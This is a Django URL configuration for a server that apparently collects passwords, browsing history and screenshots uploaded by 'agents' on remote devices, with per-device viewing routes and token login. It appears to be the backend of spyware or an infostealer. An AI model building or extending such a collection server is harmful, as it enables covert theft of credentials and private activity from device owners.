from django.urls import path
from . import views
from . import consumers
from rest_framework_simplejwt.views import TokenObtainPairView,TokenRefreshView

urlpatterns = [
    # Endpoint for agents to connect and retrieve a token by providing hardware model details
    path('device-info/',views.DevicesView.as_view(),name="DeviceView"),

    # path for the users 
    path('device-info/<path:pk>',views.DeviceDetailView.as_view(),name="DetailDeviceView"),
    path('<path:pk>/passwords/',views.PasswordView.as_view(),name="PasswordView"),
    path('<path:pk>/history/',views.HistoryView.as_view(),name="HistoryView"),
    path('<path:pk>/screenshots/',views.ScreenshotView.as_view(),name="ScreenshotView"),
    
    # path for the agents
    path('passwords/',views.PasswordView.as_view(),name="AgentPasswordView"),
    path('history/',views.HistoryView.as_view(),name="HistoryView"),
    path('screenshots/',views.ScreenshotView.as_view(),name="ScreenshotView"),
    
    # path for user login
    path('token/', TokenObtainPairView.as_view(), name='token_obtain_pair'),
    path('token/refresh/', TokenRefreshView.as_view(), name='token_refresh'),
    path('register/', views.RegisterView, name='auth_register'),
    path('login/', views.LoginView.as_view(), name='auth_login'),
]
